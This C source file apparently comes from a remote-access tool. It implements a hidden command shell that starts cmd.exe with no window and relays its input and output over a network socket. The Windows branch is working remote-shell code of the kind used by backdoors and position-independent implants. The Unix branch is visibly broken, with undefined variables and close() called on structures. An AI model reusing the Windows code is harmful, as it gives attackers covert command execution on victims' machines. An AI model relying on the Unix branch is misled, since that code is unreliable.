/**
  Copyright © 2016 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include "s5.h"

#ifdef WIN

/**F*********************************************
 *
 * entrypoint of PIC
 *
 ************************************************/
DWORD wait_evt (HANDLE *evt, DWORD evt_cnt, 
  DWORD sck_evt, SOCKET s)
{
  WSANETWORKEVENTS ne;
  DWORD            e;
  int              opt;
  
  // set socket to non-blocking mode
  WSAEventSelect (s, evt[sck_evt], FD_CLOSE | FD_READ);
  // wait for read/close events on socket + termination of cmd.exe
  e=WaitForMultipleObjects (evt_cnt, evt, FALSE, INFINITE);
  // enumerate events on socket
  WSAEnumNetworkEvents (s, evt[sck_evt], &ne);
  // disable events on socket  
  WSAEventSelect (s, evt[sck_evt], 0);
  // set to blocking mode
  opt=0;
  ioctlsocket (s, FIONBIO, &opt);
  // socket closed?
  if (ne.lNetworkEvents & FD_CLOSE) {
    e = ~0UL;
  }
  return e;
}

/**F*****************************************************************/
void c_cmd (spp_ctx *c)
{
  SECURITY_ATTRIBUTES sa;
  PROCESS_INFORMATION pi;
  STARTUPINFO         si;
  OVERLAPPED          lap;
  
  HANDLE              lh[4];
  DWORD               p, e, wr;
  spp_blk             in, out;
  int                 r;
  char                buf[MAX_PATH];
  HANDLE              evt[MAXIMUM_WAIT_OBJECTS];
  DWORD               evt_cnt=0, sck_evt=0, stdout_evt=0, proc_evt=0;

  DEBUG_PRINT ("create event for socket");
  evt[sck_evt = evt_cnt++] = WSACreateEvent();

  DEBUG_PRINT("create event for stdout handle of cmd.exe");
  evt[stdout_evt = evt_cnt++] = CreateEvent (NULL, TRUE, TRUE, NULL);
        
  DEBUG_PRINT("initialize security descriptor");
  sa.nLength              = sizeof (SECURITY_ATTRIBUTES);
  sa.lpSecurityDescriptor = NULL;
  sa.bInheritHandle       = TRUE;
  
  DEBUG_PRINT("create anonymous read/write pipes for stdin of cmd.exe");
  if (CreatePipe (&lh[0], &lh[1], &sa, 0)) 
  {  
    DEBUG_PRINT("format named pipe using tick count and current process id");
    wnsprintf (buf, MAX_PATH, "\\\\.\\pipe\\%08X", 
      GetCurrentProcessId() ^ GetTickCount());
    
    DEBUG_PRINT("create named pipe for stdout/stderr of cmd.exe");
    lh[2] = CreateNamedPipe (buf, 
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE     | PIPE_READMODE_BYTE | PIPE_WAIT, 
        PIPE_UNLIMITED_INSTANCES, 0, 0, 0, NULL);
        
    if (lh[2] != INVALID_HANDLE_VALUE) 
    { 
      DEBUG_PRINT("open the named pipe");
      lh[3] = CreateFile (buf, MAXIMUM_ALLOWED, 
          0, &sa, OPEN_EXISTING, 0, NULL);
      
      if (lh[3] != INVALID_HANDLE_VALUE) 
      {
        // zero initialize parameters for CreateProcess
        ZeroMemory (&si, sizeof (si));
        ZeroMemory (&pi, sizeof (pi));

        si.cb              = sizeof (si);
        si.hStdInput       = lh[0];  // assign the anon read pipe
        si.hStdError       = lh[3];  // assign the named write pipe
        si.hStdOutput      = lh[3];  // 
        si.dwFlags         = STARTF_USESTDHANDLES;
        
        DEBUG_PRINT("execute cmd.exe with no window");
        if (CreateProcess (NULL, "cmd", NULL, NULL, TRUE, 
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) 
        {
          // monitor state of cmd.exe
          evt[proc_evt = evt_cnt++] = pi.hProcess;
          
          ZeroMemory (&lap, sizeof (lap));
          // assign stdout event
          lap.hEvent = evt[stdout_evt];
          
          // set pending to 0
          p=0;
          
          for (;;)
          {
            DEBUG_PRINT("wait for events on cmd.exe and socket");
            e=wait_evt(evt, evt_cnt, sck_evt, c->s);

            // cmd.exe ended?
            if (e==proc_evt) {
              DEBUG_PRINT("cmd.exe ended");
              break;
            }
            
            // wait failed?
            if (e == -1) {
              DEBUG_PRINT("wait failed");
              break;
            }
            // is this socket event?
            if (e == sck_evt) 
            {
              // receive data from socket
              r=spp_recv (c, &in);
              if (r!=SPP_ERR_OK) {
                DEBUG_PRINT("spp_recv error");
                break;
              }
              // write to stdin of cmd.exe using anonymous write pipe
              WriteFile (lh[1], in.buf, in.len, &wr, 0);             
            } else
           
            // output from cmd.exe?
            if (e == stdout_evt) 
            {
              // if not in pending read state, read from named pipe
              if (p == 0)
              {
                ReadFile (lh[2], out.buf, SPP_DATA_LEN, (LPDWORD)&out.len, &lap);
                p++;
              } else {
                // get overlapped result
                if (!GetOverlappedResult (lh[2], &lap, (LPDWORD)&out.len, FALSE)) {
                  break;
                }
              }
              // if we have something
              if (out.len != 0)
              {
                // send to remote
                r=spp_send (c, &out);
                if (r!=SPP_ERR_OK) {
                  DEBUG_PRINT("spp_send error %i", r);
                  break;
                }
                p--;
              }
            }
          }
          // end cmd.exe incase it's still running
          TerminateProcess (pi.hProcess, 0);
          // close handles and decrease events
          CloseHandle (pi.hThread);
          CloseHandle (pi.hProcess);
          evt_cnt--;
        }
        // close handle to named pipe for stdout
        CloseHandle (lh[3]);
      }
      // close named pipe for stdout
      CloseHandle (lh[2]);
    }
    // close anon pipes for read/write to stdin
    CloseHandle (lh[1]);
    CloseHandle (lh[0]);
  }
  // close stdout event handle
  CloseHandle (evt[stdout_evt]);
  evt_cnt--;
  // close socket event handle
  CloseHandle (evt[sck_evt]);
  evt_cnt--;
  // tell server, we're exiting
  DEBUG_PRINT("sending termination signal");
  out.len=0;
  spp_send(c, &out);
}

#else
void c_cmd (spp_ctx *c)
{
  fd_set  fdr;
  int     r;
  spp_blk in;
  
  close (in);
  close (out);
  
  for (;;)
  {
    FD_ZERO(&fdr);
    FD_SET(c->s, &fdr);
    FD_SET(out[0], &fdr);
    
    r = select(FD_SETSIZE, &fdr, 0, 0, 0);
    if (r < 0) break;
    
    if (FD_ISSET(s, &fdr)) {
      r = spp_recv(c, &x);
      if (r <= 0) break;
      write(in[1], x.buf, x.len);
    } else
    if (FD_ISSET(out[0], &fdr)) {
      len=read (out[0], buf, BUFSIZ);
      if (len<=0) break;
      spp_send(c, &x);
    }
  }
  kill(c->pid, SIGCHLD);
  close (in[1]);
  close (out[0]);
}
#endif
